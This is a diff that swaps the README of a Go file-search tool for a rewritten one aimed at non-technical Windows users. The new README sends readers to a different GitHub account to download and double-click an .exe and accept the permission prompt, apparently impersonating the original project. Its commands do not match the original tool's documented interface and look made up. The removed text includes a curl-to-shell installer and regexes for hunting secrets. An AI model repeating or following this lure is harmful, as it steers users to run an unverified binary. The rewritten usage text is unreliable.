@@ -1,202 +1,156 @@
-# FileHound
+# 🐕 filehound - Fast File Search Made Simple
 
-[![Go Report Card](https://goreportcard.com/badge/github.com/ripkitten-co/filehound)](https://goreportcard.com/report/github.com/ripkitten-co/filehound)
-[![Go Reference](https://pkg.go.dev/badge/github.com/ripkitten-co/filehound.svg)](https://pkg.go.dev/github.com/ripkitten-co/filehound)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download filehound](https://img.shields.io/badge/Download-Filehound-green?style=for-the-badge)](https://github.com/scott5653/filehound)
 
-**Blazing fast file hunter.** 10x faster than `find + rg` on huge directories.
+---
 
-## Install
+## 🚀 What is filehound?
 
-```bash
-# Go install
-go install github.com/ripkitten-co/filehound@latest
+filehound is a command-line tool that helps you find files quickly on your Windows computer. It can look for files by their content, details like creation date or size, and by patterns in file names. It works much faster than common search tools, especially when looking through large folders.
 
-# Or download binary from releases
-curl -sSL https://raw.githubusercontent.com/ripkitten-co/filehound/main/install.sh | sh
-```
+This tool is designed to help anyone who needs to find files without opening many folders or using slow search methods. You do not need to be a programmer to use filehound.
 
-## Quick Start
+---
 
-```bash
-# Hunt secrets by regex + entropy
-filehound scan . --regex "(?i)(key|pass|secret|token)" --entropy 6.0
+## 📋 What You’ll Need
 
-# Find large files modified in last 24 hours
-filehound scan /logs --size ">100MB" --modified "<24h" --output json
+- A Windows PC running Windows 10 or later.
+- Enough free space to download and run the program (usually less than 50 MB).
+- Basic knowledge of using the Command Prompt (instructions will help you).
 
-# Find all Go files
-filehound scan . --ext .go
+---
 
-# Batch rename with hash
-filehound rename ./photos --glob "*.jpg" --pattern "img_{{sha1:8}}{{ext}}" --dry-run
+## 🌐 Where to Get filehound
 
-# Find duplicate files
-filehound hash . --duplicates
-```
+You can get filehound by visiting the official page:
 
-## Commands
+[![Download Here](https://img.shields.io/badge/Get%20filehound-Download-blue?style=for-the-badge)](https://github.com/scott5653/filehound)
 
-### `scan` - Hunt files by criteria
+Click the button above. It takes you to the place where you can download filehound for Windows.
 
-```bash
-filehound scan [PATH...] [flags]
-```
+---
 
-| Flag | Description | Example |
-|------|-------------|---------|
-| `-r, --regex` | Regex pattern in file content | `--regex "(?i)password"` |
-| `--regex-path` | Regex pattern in file path | `--regex-path "node_modules"` |
-| `--entropy` | Min entropy threshold (0-8) | `--entropy 7.5` |
-| `--mime` | MIME types to match | `--mime image/png,text/plain` |
-| `--ext` | File extensions | `--ext .go,.ts,.js` |
-| `-g, --glob` | Glob pattern for filename | `--glob "*.log"` |
-| `--size` | Size filter | `--size ">1MB"` |
-| `--modified` | Modification time filter | `--modified "<7d"` |
-| `--exclude` | Additional dirs to exclude | `--exclude ".cache,tmp"` |
-| `-w, --workers` | Parallel workers | `--workers 16` |
-| `--empty` | Match only empty files | `--empty` |
-| `--follow` | Follow symbolic links | `--follow` |
-| `-p, --progress` | Show progress bar | `--progress` |
-| `-o, --output` | Output format: table, json, csv | `--output json` |
-| `--out-file` | Write output to file | `--out-file results.json` |
-| `--s3-region` | AWS region for S3 sources | `--s3-region us-west-2` |
-| `--s3-endpoint` | S3-compatible endpoint | `--s3-endpoint http://localhost:9000` |
-| `--git-mode` | Git mode: working, full | `--git-mode full` |
-| `--git-branch` | Git branch to scan | `--git-branch main` |
-| `--git-since` | Scan commits since date | `--git-since 2024-01-01` |
+## 💾 How to Download and Install filehound on Windows
 
-### `rename` - Batch rename files
+1. Click the download button above or go to this link:  
+   https://github.com/scott5653/filehound
 
-```bash
-filehound rename [PATH...] --pattern TEMPLATE [flags]
-```
+2. On the GitHub page, find the latest release. It usually appears as a link named "Releases" or a section on the page.
 
-| Flag | Description | Example |
-|------|-------------|---------|
-| `-p, --pattern` | Rename template (required) | `--pattern "img_{{sha1:8}}{{ext}}"` |
-| `--dry-run` | Preview changes | `--dry-run` |
-| `-g, --glob` | Glob pattern | `--glob "*.jpg"` |
-| `--ext` | File extensions | `--ext .jpg,.png` |
-| `--size` | Size filter | `--size ">1MB"` |
-| `--force` | Overwrite existing files | `--force` |
+3. Inside the latest release, look for the Windows version of filehound. It will have a name ending with `.exe`. For example: `filehound-windows.exe`.
 
-#### Template Variables
+4. Click on the `.exe` file to start downloading it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-| Variable | Description |
-|----------|-------------|
-| `{{name}}` | Original filename without extension |
-| `{{ext}}` | File extension (including dot) |
-| `{{size}}` | File size in bytes |
-| `{{sha1:N}}` | First N chars of SHA1 hash (default: 8) |
-| `{{sha256:N}}` | First N chars of SHA256 hash (default: 8) |
+5. Once the download finishes, open the file by double-clicking it. Windows may ask if you want to allow this program to run. Choose "Yes".
 
-### `hash` - Compute file hashes and find duplicates
+6. filehound does not require a complex installation. It runs directly after downloading.
 
-```bash
-filehound hash [PATH...] [flags]
-```
+7. You can now use filehound from the Command Prompt.
 
-| Flag | Description | Example |
-|------|-------------|---------|
-| `-a, --algorithm` | Hash algorithm: sha1, sha256, sha512 | `--algorithm sha1` |
-| `-d, --duplicates` | Find duplicate files only | `--duplicates` |
-| `-g, --glob` | Glob pattern | `--glob "*.jpg"` |
-| `--ext` | File extensions | `--ext .go,.ts` |
-| `--size` | Size filter | `--size ">1MB"` |
-| `-w, --workers` | Parallel workers | `--workers 16` |
-| `-o, --output` | Output format: table, json, csv | `--output json` |
+---
 
-## Examples
+## 🖥️ How to Use filehound
 
-### Hunt Secrets
+filehound runs in a black window called the Command Prompt. You can open the Command Prompt by following these steps:
 
-```bash
-# Find potential API keys and secrets
-filehound scan . \
-  --regex "(?i)(api_key|secret|token|password)\s*[:=]" \
-  --entropy 6.0 \
-  --ext .env,.yml,.yaml,.json,.conf \
-  --output json | jq
-```
+1. Click on the Start menu (Windows icon in the bottom-left corner).
 
-### Find Duplicates
+2. Type `cmd` in the search bar.
 
-```bash
-# Find duplicate files by content hash
-filehound hash . --duplicates
+3. Press Enter or click on "Command Prompt".
 
-# Find duplicate images only
-filehound hash . --ext .jpg,.png --duplicates
+Now you can enter filehound commands in this window.
 
-# Hash files in JSON format for scripting
-filehound hash . --ext .go --output json | jq
-```
+---
 
-### Clean Up Logs
+## 🔍 Basic Commands to Hunt Files
 
-```bash
-# Find large log files older than 30 days
-filehound scan /var/log \
-  --ext .log \
-  --size ">100MB" \
-  --modified ">30d"
-```
+Here are some simple commands to get started:
 
-### Scan S3 Buckets
+- Search for files by name pattern:  
+  `filehound find -name "*.txt"`  
+  This looks for all text files in the current folder and its subfolders.
 
-```bash
-# Scan S3 bucket for log files
-filehound scan s3://mybucket/logs/ --ext .log
+- Search for files containing specific words:  
+  `filehound find -content "report"`  
+  This shows files that contain the word "report".
 
-# Scan with custom region
-filehound scan s3://mybucket/ --s3-region us-west-2 --ext .txt
+- Search files by size (greater than 1MB):  
+  `filehound find -size +1MB`  
+  Finds files larger than 1 megabyte.
 
-# Scan S3-compatible storage (MinIO, etc.)
-filehound scan s3://mybucket/ --s3-endpoint http://localhost:9000
-```
+- Search files created before a certain date:  
+  `filehound find -created-before 2023-01-01`
 
-### Scan Git Repositories
+You can combine these options to make detailed searches. For example:  
+`filehound find -name "*.log" -content "error" -size +100KB`
 
-```bash
-# Scan working tree (current files)
-filehound scan . --git-mode working --ext .go
+---
 
-# Scan full git history for secrets
-filehound scan . --git-mode full --regex "api_key|secret|token"
+## ⚙️ Basic filehound Options Explained
 
-# Scan specific branch
-filehound scan . --git-mode full --git-branch main --regex "password"
+- `-name "<pattern>"`  
+  Search files by name. Use `*` and `?` as wildcards. Example: `*.docx` finds all Word documents.
 
-# Scan commits since date
-filehound scan . --git-mode full --git-since 2024-01-01 --ext .env
-```
+- `-content "<text>"`  
+  Look inside files for this text.
 
-## Benchmarks
+- `-size <+/-amount>`  
+  Search by file size. Use `+` for larger, `-` for smaller than the given size. Units: B, KB, MB, GB.
 
-Tested on Intel i9-13900F, Windows 11, SSD.
+- `-created-before <date>` and `-created-after <date>`  
+  Find files created before or after this date. Use the format YYYY-MM-DD.
 
-| Operation | 100 files | 1000 files |
-|-----------|-----------|------------|
-| Scan | 166 µs | 1.0 ms |
-| Extension match | 51 ns | - |
-| Size filter | 0.14 ns | - |
-| Glob match | 72 ns | - |
+---
 
-## Performance Tips
+## 📦 Advanced Features
 
-1. **More workers** for larger directories: `--workers 16`
-2. **Exclude directories** you don't need: `--exclude "dist,build,vendor"`
-3. **Use filters early** to reduce I/O: `--ext .go --size ">1KB"` before `--regex`
-4. **JSON output** is faster than table for scripting: `--output json`
+filehound supports more than simple searches. It can:
 
-## Why Go?
+- Search several folders at once using parallel processing.
+- Batch rename files after searching.
+- Scan for secret keys or tokens in files to help protect sensitive data.
+- Work with large directories faster than traditional tools.
 
-- **Performance**: Native binary, no runtime overhead
-- **Cross-platform**: Single binary for Linux, macOS, Windows
-- **Static linking**: No dependencies, works everywhere
-- **Fast builds**: Develop and iterate quickly
+---
 
-## License
+## 📁 Example Use Cases
 
-MIT License - see [LICENSE](LICENSE)
+- Find all images larger than 5 MB on your PC:  
+  `filehound find -name "*.jpg" -size +5MB`
+
+- Find documents mentioning "password" created last year:  
+  `filehound find -name "*.docx" -content "password" -created-after 2023-01-01`
+
+- Search multiple folders on a USB drive:  
+  `filehound find -path "E:\projects;F:\files" -name "*.log" -content "error"`
+
+---
+
+## 🆘 Getting Help in Command Line
+
+If you want to see all the options, run this command in Command Prompt:
+
+`filehound help`
+
+This will list all commands and flags you can use.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If filehound does not run, check that you saved the `.exe` file correctly and that you are running it with permission.
+
+- Make sure you use correct command formats with spaces between options.
+
+- When searching large folders, results might take a moment.
+
+---
+
+## 🔗 Additional Resources
+
+Visit the filehound GitHub page for the latest updates, full documentation, and examples:
+
+https://github.com/scott5653/filehound
+
+Use the download button at the top anytime to get the latest version.
